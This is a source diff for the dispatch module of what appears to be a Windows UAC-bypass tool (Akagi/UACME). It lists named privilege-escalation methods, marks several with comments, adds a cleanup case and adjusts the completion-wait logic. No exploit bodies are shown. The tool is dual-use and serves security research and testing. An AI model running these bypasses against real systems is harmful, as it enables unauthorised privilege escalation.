@@ -6,7 +6,7 @@
 *
 *  VERSION:     3.71
 *
-*  DATE:        21 Jul 2026
+*  DATE:        23 Jul 2026
 *
 *  UAC bypass dispatch.
 *
@@ -79,21 +79,21 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[] = {
     { UacMethodTest,                MethodTest, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { UacMethodDISM,                MethodDism, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { UacMethodUiAccess,            MethodUiAccess, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { UacMethodMsSettings,          MethodMsSettings, { NT_WIN10_THRESHOLD1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { UacMethodDiskSilentCleanup,   MethodTyranid, { NT_WIN8_BLUE, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { UacMethodMsSettings,          MethodMsSettings, { NT_WIN10_THRESHOLD1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE }, // nw
+    { UacMethodDiskSilentCleanup,   MethodTyranid, { NT_WIN8_BLUE, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE }, //nw
     { UacMethodHakril,              MethodHakril, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, FALSE, TRUE },
     { UacMethodCorProfiler,         MethodCorProfiler, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { UacMethodCMLuaUtil,           MethodCMLuaUtil, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
-    { UacMethodDccwCOM,             MethodDccwCOM, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, TRUE },
-    { UacMethodShellSdclt,          MethodShellSdctl, { NT_WIN10_REDSTONE1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { UacMethodDebugObject,         MethodDebugObject, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { UacMethodShellChangePk,       MethodShellChangePk, { NT_WIN10_REDSTONE1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { UacMethodMsSettings2,         MethodMsSettings, { NT_WIN10_REDSTONE4, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { UacMethodCMLuaUtil,           MethodCMLuaUtil, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE }, //nw
+    { UacMethodDccwCOM,             MethodDccwCOM, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE }, //nw
+    { UacMethodShellSdclt,          MethodShellSdctl, { NT_WIN10_REDSTONE1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE }, //nw
+    { UacMethodDebugObject,         MethodDebugObject, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE }, //nw
+    { UacMethodShellChangePk,       MethodShellChangePk, { NT_WIN10_REDSTONE1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE }, //nw
+    { UacMethodMsSettings2,         MethodMsSettings, { NT_WIN10_REDSTONE4, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE }, //nw
     { UacMethodNICPoison,           MethodNICPoison, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { UacMethodIeAddOnInstall,      MethodIeAddOnInstall, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { UacMethodMsSettingsProtocol,  MethodProtocolHijack, { NT_WIN10_THRESHOLD1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
-    { UacMethodMsStoreProtocol,     MethodProtocolHijack, { NT_WIN10_REDSTONE5, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
-    { UacMethodCurVer,              MethodCurVer, { NT_WIN10_THRESHOLD1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { UacMethodMsSettingsProtocol,  MethodProtocolHijack, { NT_WIN10_THRESHOLD1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE }, //nw
+    { UacMethodMsStoreProtocol,     MethodProtocolHijack, { NT_WIN10_REDSTONE5, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE }, //nw
+    { UacMethodCurVer,              MethodCurVer, { NT_WIN10_THRESHOLD1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE }, //nw
     { UacMethodNICPoison2,          MethodNICPoison, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { UacMethodMsdt,                MethodMsdt, { NT_WIN10_THRESHOLD1, MAXDWORD }, FUBUKI32_ID, FALSE, FALSE, TRUE },
     { UacMethodVFServerTaskSched,   MethodVFServerTaskSched, { NT_WIN8_BLUE, MAXDWORD}, AKATSUKI_ID, FALSE, TRUE, TRUE },
@@ -266,6 +266,10 @@ VOID PostCleanupAttempt(
 {
     switch (Method) {
 
+    case UacMethodCorProfiler:
+        ucmCorProfilerCleanup();
+        break;
+
     case UacMethodDISM:
     case UacMethodJunction:
         ucmDismMethodCleanup();
@@ -316,7 +320,7 @@ NTSTATUS MethodsManagerCall(
     _In_ UCM_METHOD Method
 )
 {
-    BOOL        bParametersBlockSet = FALSE, bMasqueraded = FALSE;
+    BOOL        bParametersBlockSet = FALSE, bMasqueraded = FALSE, bWaitForCompletion = FALSE;
     NTSTATUS    MethodResult, Status;
     ULONG       PayloadSize = 0, DataSize = 0;
     PVOID       PayloadCode = NULL, Resource = NULL;
@@ -414,17 +418,22 @@ NTSTATUS MethodsManagerCall(
     //
     // Set shared parameters.
     //
-    //   1. Execution parameters (flag, session id, winstation\desktop)
+    //   1. Execution parameters
     //   2. Optional parameter from Akagi command line.
     //
     if (Entry->SetParameters) {
         RtlSecureZeroMemory(&SharedParams, sizeof(UACME_PARAM_BLOCK));
         bParametersBlockSet = supCreateSharedParametersBlock(g_ctx, Method, &SharedParams);
         ucmConsolePrintValueUlong(TEXT("[+] MethodsManagerCall->supCreateSharedParametersBlock"), bParametersBlockSet, FALSE);
-        ucmConsolePrintText(TEXT("[+] SharedParams->szOptionalParameter1"), SharedParams.szOptionalParameter1);
-        ucmConsolePrintText(TEXT("[+] SharedParams->szOptionalParameter2"), SharedParams.szOptionalParameter2);
-    }
 
+        ucmConsolePrintText(TEXT("[+] SharedParams->szOptionalParameter1"),
+            SharedParams.szOptionalParameter1[0] != 0 ? SharedParams.szOptionalParameter1 : TEXT("(empty)"));
+        ucmConsolePrintText(TEXT("[+] SharedParams->szOptionalParameter2"),
+            SharedParams.szOptionalParameter2[0] != 0 ? SharedParams.szOptionalParameter2 : TEXT("(empty)"));
+
+        bWaitForCompletion = bParametersBlockSet;
+    }
+    
     MethodResult = Entry->Routine(&ArgsBlock);
 
     if (PayloadCode) {
@@ -435,7 +444,7 @@ NTSTATUS MethodsManagerCall(
     //
     // Wait a little bit for completion.
     //
-    if (Entry->SetParameters && bParametersBlockSet) {
+    if (bWaitForCompletion) {
         Status = supWaitForGlobalCompletionEvent();
         ucmConsolePrintStatus(TEXT("[+] MethodsManagerCall->supWaitForGlobalCompletionEvent"), Status);
         supDestroySharedParametersBlock(g_ctx);
